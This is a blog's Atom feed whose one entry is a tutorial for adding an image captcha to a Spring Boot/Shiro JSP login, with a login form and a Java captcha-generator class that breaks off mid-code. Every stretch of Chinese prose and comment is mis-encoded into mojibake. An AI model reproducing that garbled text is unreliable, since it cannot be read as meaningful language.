<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>51nd0re1</title>
  
  <subtitle>æˆ‘æ˜¯ä¸€åªwebç‹—</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-02-21T08:22:26.427Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>51nd0re1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shiro-2020/2/21-å›¾å½¢éªŒè¯ç </title>
    <link href="http://yoursite.com/2021/02/21/Shiro-2020-2-21-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yoursite.com/2021/02/21/Shiro-2020-2-21-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81/</id>
    <published>2021-02-21T08:11:01.000Z</published>
    <updated>2021-02-21T08:22:26.427Z</updated>
    
    <content type="html"><![CDATA[<p><del>æˆ‘æ˜¯ä¸€åªé¸½å­ å’•å’•å’•</del></p><h1 id="å›¾å½¢éªŒè¯ç "><a href="#å›¾å½¢éªŒè¯ç " class="headerlink" title="å›¾å½¢éªŒè¯ç "></a>å›¾å½¢éªŒè¯ç </h1><p>å›¾ç‰‡éªŒè¯ç å°±ä¸å¤šä»‹ç»äº†<br>ä¿®æ”¹login.jsp<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@page</span> <span class="attr">contentType</span>=<span class="string">"text/html; UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç”¨æˆ·ç™»å½•<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/login"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        ç”¨æˆ·å:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> &gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        å¯†ç   : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        è¯·è¾“å…¥éªŒè¯ç : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"code"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/getImage"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ç™»å½•"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å°±éœ€è¦æ„å»ºéªŒè¯ç çš„å·¥å…·ç±»<br>åœ¨utilsä¸‹æ–°å»ºVerifyCodeUtils.java<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.utils;</span><br><span class="line"></span><br><span class="line">import javax.imageio.ImageIO;</span><br><span class="line">import java.awt.*;</span><br><span class="line">import java.awt.geom.AffineTransform;</span><br><span class="line">import java.awt.image.BufferedImage;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.OutputStream;</span><br><span class="line">import java.util.Arrays;</span><br><span class="line">import java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *@åˆ›å»ºäºº  cx</span></span><br><span class="line"><span class="comment"> *@åˆ›å»ºæ—¶é—´  2018/11/27 17:36</span></span><br><span class="line"><span class="comment"> *@æè¿°   éªŒè¯ç ç”Ÿæˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="keyword">class</span> VerifyCodeUtils&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä½¿ç”¨åˆ°Algerianå­—ä½“ï¼Œç³»ç»Ÿé‡Œæ²¡æœ‰çš„è¯éœ€è¦å®‰è£…å­—ä½“ï¼Œå­—ä½“åªæ˜¾ç¤ºå¤§å†™ï¼Œå»æ‰äº†1,0,i,oå‡ ä¸ªå®¹æ˜“æ··æ·†çš„å­—ç¬¦</span></span><br><span class="line">    public static final String VERIFY_CODES = <span class="string">"23456789ABCDEFGHJKLMNPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">private</span> static Random random = <span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨ç³»ç»Ÿé»˜è®¤å­—ç¬¦æºç”ŸæˆéªŒè¯ç </span></span><br><span class="line"><span class="comment">     * @param verifySize    éªŒè¯ç é•¿åº¦</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String generate<span class="constructor">VerifyCode(<span class="params">int</span> <span class="params">verifySize</span>)</span>&#123;</span><br><span class="line">        return generate<span class="constructor">VerifyCode(<span class="params">verifySize</span>, VERIFY_CODES)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨æŒ‡å®šæºç”ŸæˆéªŒè¯ç </span></span><br><span class="line"><span class="comment">     * @param verifySize    éªŒè¯ç é•¿åº¦</span></span><br><span class="line"><span class="comment">     * @param sources   éªŒè¯ç å­—ç¬¦æº</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String generate<span class="constructor">VerifyCode(<span class="params">int</span> <span class="params">verifySize</span>, String <span class="params">sources</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sources<span class="operator"> == </span>null<span class="operator"> || </span>sources.length<span class="literal">()</span><span class="operator"> == </span><span class="number">0</span>)&#123;</span><br><span class="line">            sources = VERIFY_CODES;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">int</span> codesLen = sources.length<span class="literal">()</span>;</span><br><span class="line">        Random rand = <span class="keyword">new</span> <span class="constructor">Random(System.<span class="params">currentTimeMillis</span>()</span>);</span><br><span class="line">        StringBuilder verifyCode = <span class="keyword">new</span> <span class="constructor">StringBuilder(<span class="params">verifySize</span>)</span>;</span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; verifySize; i++)&#123;</span><br><span class="line">            verifyCode.append(sources.<span class="built_in">char</span><span class="constructor">At(<span class="params">rand</span>.<span class="params">nextInt</span>(<span class="params">codesLen</span>-1)</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        return verifyCode.<span class="keyword">to</span><span class="constructor">String()</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”ŸæˆéšæœºéªŒè¯ç æ–‡ä»¶,å¹¶è¿”å›éªŒè¯ç å€¼</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param outputFile</span></span><br><span class="line"><span class="comment">     * @param verifySize</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String output<span class="constructor">VerifyImage(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, File <span class="params">outputFile</span>, <span class="params">int</span> <span class="params">verifySize</span>)</span> throws IOException&#123;</span><br><span class="line">        String verifyCode = generate<span class="constructor">VerifyCode(<span class="params">verifySize</span>)</span>;</span><br><span class="line">        output<span class="constructor">Image(<span class="params">w</span>, <span class="params">h</span>, <span class="params">outputFile</span>, <span class="params">verifyCode</span>)</span>;</span><br><span class="line">        return verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¾“å‡ºéšæœºéªŒè¯ç å›¾ç‰‡æµ,å¹¶è¿”å›éªŒè¯ç å€¼</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param os</span></span><br><span class="line"><span class="comment">     * @param verifySize</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static String output<span class="constructor">VerifyImage(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, OutputStream <span class="params">os</span>, <span class="params">int</span> <span class="params">verifySize</span>)</span> throws IOException&#123;</span><br><span class="line">        String verifyCode = generate<span class="constructor">VerifyCode(<span class="params">verifySize</span>)</span>;</span><br><span class="line">        output<span class="constructor">Image(<span class="params">w</span>, <span class="params">h</span>, <span class="params">os</span>, <span class="params">verifyCode</span>)</span>;</span><br><span class="line">        return verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”ŸæˆæŒ‡å®šéªŒè¯ç å›¾åƒæ–‡ä»¶</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param outputFile</span></span><br><span class="line"><span class="comment">     * @param code</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static void output<span class="constructor">Image(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, File <span class="params">outputFile</span>, String <span class="params">code</span>)</span> throws IOException&#123;</span><br><span class="line">        <span class="keyword">if</span>(outputFile<span class="operator"> == </span>null)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        File dir = outputFile.get<span class="constructor">ParentFile()</span>;</span><br><span class="line">        <span class="keyword">if</span>(!dir.exists<span class="literal">()</span>)&#123;</span><br><span class="line">            dir.mkdirs<span class="literal">()</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            outputFile.create<span class="constructor">NewFile()</span>;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> <span class="constructor">FileOutputStream(<span class="params">outputFile</span>)</span>;</span><br><span class="line">            output<span class="constructor">Image(<span class="params">w</span>, <span class="params">h</span>, <span class="params">fos</span>, <span class="params">code</span>)</span>;</span><br><span class="line">            fos.close<span class="literal">()</span>;</span><br><span class="line">        &#125; catch(IOException e)&#123;</span><br><span class="line">            throw e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¾“å‡ºæŒ‡å®šéªŒè¯ç å›¾ç‰‡æµ</span></span><br><span class="line"><span class="comment">     * @param w</span></span><br><span class="line"><span class="comment">     * @param h</span></span><br><span class="line"><span class="comment">     * @param os</span></span><br><span class="line"><span class="comment">     * @param code</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public static void output<span class="constructor">Image(<span class="params">int</span> <span class="params">w</span>, <span class="params">int</span> <span class="params">h</span>, OutputStream <span class="params">os</span>, String <span class="params">code</span>)</span> throws IOException&#123;</span><br><span class="line">        <span class="built_in">int</span> verifySize = code.length<span class="literal">()</span>;</span><br><span class="line">        BufferedImage image = <span class="keyword">new</span> <span class="constructor">BufferedImage(<span class="params">w</span>, <span class="params">h</span>, BufferedImage.TYPE_INT_RGB)</span>;</span><br><span class="line">        Random rand = <span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line">        Graphics2D g2 = image.create<span class="constructor">Graphics()</span>;</span><br><span class="line">        g2.set<span class="constructor">RenderingHint(RenderingHints.KEY_ANTIALIASING,RenderingHints.VALUE_ANTIALIAS_ON)</span>;</span><br><span class="line">        Color<span class="literal">[]</span> colors = <span class="keyword">new</span> Color<span class="literal">[<span class="number">5</span>]</span>;</span><br><span class="line">        Color<span class="literal">[]</span> colorSpaces = <span class="keyword">new</span> Color<span class="literal">[]</span> &#123; Color.WHITE, Color.CYAN,</span><br><span class="line">                Color.GRAY, Color.LIGHT_GRAY, Color.MAGENTA, Color.ORANGE,</span><br><span class="line">                Color.PINK, Color.YELLOW &#125;;</span><br><span class="line">        <span class="built_in">float</span><span class="literal">[]</span> fractions = <span class="keyword">new</span> <span class="built_in">float</span><span class="literal">[<span class="identifier">colors</span>.<span class="identifier">length</span>]</span>;</span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; colors.length; i++)&#123;</span><br><span class="line">            colors<span class="literal">[<span class="identifier">i</span>]</span> = colorSpaces<span class="literal">[<span class="identifier">rand</span>.<span class="identifier">nextInt</span>(<span class="identifier">colorSpaces</span>.<span class="identifier">length</span>)]</span>;</span><br><span class="line">            fractions<span class="literal">[<span class="identifier">i</span>]</span> = rand.next<span class="constructor">Float()</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">Arrays</span>.</span></span>sort(fractions);</span><br><span class="line"></span><br><span class="line">        g2.set<span class="constructor">Color(Color.GRAY)</span>;<span class="comment">// è®¾ç½®è¾¹æ¡†è‰²</span></span><br><span class="line">        g2.fill<span class="constructor">Rect(0, 0, <span class="params">w</span>, <span class="params">h</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Color c = get<span class="constructor">RandColor(200, 250)</span>;</span><br><span class="line">        g2.set<span class="constructor">Color(<span class="params">c</span>)</span>;<span class="comment">// è®¾ç½®èƒŒæ™¯è‰²</span></span><br><span class="line">        g2.fill<span class="constructor">Rect(0, 2, <span class="params">w</span>, <span class="params">h</span>-4)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»˜åˆ¶å¹²æ‰°çº¿</span></span><br><span class="line">        Random random = <span class="keyword">new</span> <span class="constructor">Random()</span>;</span><br><span class="line">        g2.set<span class="constructor">Color(<span class="params">getRandColor</span>(160, 200)</span>);<span class="comment">// è®¾ç½®çº¿æ¡çš„é¢œè‰²</span></span><br><span class="line">        for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">int</span> x = random.next<span class="constructor">Int(<span class="params">w</span> - 1)</span>;</span><br><span class="line">            <span class="built_in">int</span> y = random.next<span class="constructor">Int(<span class="params">h</span> - 1)</span>;</span><br><span class="line">            <span class="built_in">int</span> xl = random.next<span class="constructor">Int(6)</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">int</span> yl = random.next<span class="constructor">Int(12)</span> + <span class="number">1</span>;</span><br><span class="line">            g2.draw<span class="constructor">Line(<span class="params">x</span>, <span class="params">y</span>, <span class="params">x</span> + <span class="params">xl</span> + 40, <span class="params">y</span> + <span class="params">yl</span> + 20)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ·»åŠ å™ªç‚¹</span></span><br><span class="line">        <span class="built_in">float</span> yawpRate = <span class="number">0.05</span>f;<span class="comment">// å™ªå£°ç‡</span></span><br><span class="line">        <span class="built_in">int</span> area = (<span class="built_in">int</span>) (yawpRate<span class="operator"> * </span>w<span class="operator"> * </span>h);</span><br><span class="line">        for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; area; i++) &#123;</span><br><span class="line">            <span class="built_in">int</span> x = random.next<span class="constructor">Int(<span class="params">w</span>)</span>;</span><br><span class="line">            <span class="built_in">int</span> y = random.next<span class="constructor">Int(<span class="params">h</span>)</span>;</span><br><span class="line">            <span class="built_in">int</span> rgb = get<span class="constructor">RandomIntColor()</span>;</span><br><span class="line">            image.set<span class="constructor">RGB(<span class="params">x</span>, <span class="params">y</span>, <span class="params">rgb</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        shear(g2, w, h, c);<span class="comment">// ä½¿å›¾ç‰‡æ‰­æ›²</span></span><br><span class="line"></span><br><span class="line">        g2.set<span class="constructor">Color(<span class="params">getRandColor</span>(100, 160)</span>);</span><br><span class="line">        <span class="built_in">int</span> fontSize = h-<span class="number">4</span>;</span><br><span class="line">        Font font = <span class="keyword">new</span> <span class="constructor">Font(<span class="string">"Algerian"</span>, Font.ITALIC, <span class="params">fontSize</span>)</span>;</span><br><span class="line">        g2.set<span class="constructor">Font(<span class="params">font</span>)</span>;</span><br><span class="line">        <span class="built_in">char</span><span class="literal">[]</span> chars = code.<span class="keyword">to</span><span class="constructor">CharArray()</span>;</span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; verifySize; i++)&#123;</span><br><span class="line">            AffineTransform affine = <span class="keyword">new</span> <span class="constructor">AffineTransform()</span>;</span><br><span class="line">            affine.set<span class="constructor">ToRotation(Math.PI <span class="operator">/</span> 4 <span class="operator">*</span> <span class="params">rand</span>.<span class="params">nextDouble</span>()</span><span class="operator"> * </span>(rand.next<span class="constructor">Boolean()</span> ? <span class="number">1</span> : -<span class="number">1</span>), (w<span class="operator"> / </span>verifySize)<span class="operator"> * </span>i + fontSize/<span class="number">2</span>, h/<span class="number">2</span>);</span><br><span class="line">            g2.set<span class="constructor">Transform(<span class="params">affine</span>)</span>;</span><br><span class="line">            g2.draw<span class="constructor">Chars(<span class="params">chars</span>, <span class="params">i</span>, 1, ((<span class="params">w</span>-10)</span><span class="operator"> / </span>verifySize)<span class="operator"> * </span>i + <span class="number">5</span>, h/<span class="number">2</span> + fontSize/<span class="number">2</span> - <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        g2.dispose<span class="literal">()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">ImageIO</span>.</span></span>write(image, <span class="string">"jpg"</span>, os);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> static Color get<span class="constructor">RandColor(<span class="params">int</span> <span class="params">fc</span>, <span class="params">int</span> <span class="params">bc</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fc &gt; <span class="number">255</span>)</span><br><span class="line">            fc = <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (bc &gt; <span class="number">255</span>)</span><br><span class="line">            bc = <span class="number">255</span>;</span><br><span class="line">        <span class="built_in">int</span> r = fc + random.next<span class="constructor">Int(<span class="params">bc</span> - <span class="params">fc</span>)</span>;</span><br><span class="line">        <span class="built_in">int</span> g = fc + random.next<span class="constructor">Int(<span class="params">bc</span> - <span class="params">fc</span>)</span>;</span><br><span class="line">        <span class="built_in">int</span> b = fc + random.next<span class="constructor">Int(<span class="params">bc</span> - <span class="params">fc</span>)</span>;</span><br><span class="line">        return <span class="keyword">new</span> <span class="constructor">Color(<span class="params">r</span>, <span class="params">g</span>, <span class="params">b</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> static <span class="built_in">int</span> get<span class="constructor">RandomIntColor()</span> &#123;</span><br><span class="line">        <span class="built_in">int</span><span class="literal">[]</span> rgb = get<span class="constructor">RandomRgb()</span>;</span><br><span class="line">        <span class="built_in">int</span> color = <span class="number">0</span>;</span><br><span class="line">        for (<span class="built_in">int</span> c : rgb) &#123;</span><br><span class="line">            color = color &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            color = color <span class="pattern-match">| c;</span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match">        return color;</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static <span class="built_in">int</span>[] get<span class="constructor">RandomRgb()</span> &#123;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span>[] rgb = <span class="keyword">new</span> <span class="built_in">int</span>[3];</span></span><br><span class="line"><span class="pattern-match">        for (<span class="built_in">int</span> i = 0; i &lt; 3; i<span class="operator">++</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">            rgb[i] = random.next<span class="constructor">Int(255)</span>;</span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match">        return rgb;</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static void shear(<span class="constructor">Graphics</span> g, <span class="built_in">int</span> w1, <span class="built_in">int</span> h1, <span class="constructor">Color</span> color) &#123;</span></span><br><span class="line"><span class="pattern-match">        shear<span class="constructor">X(<span class="params">g</span>, 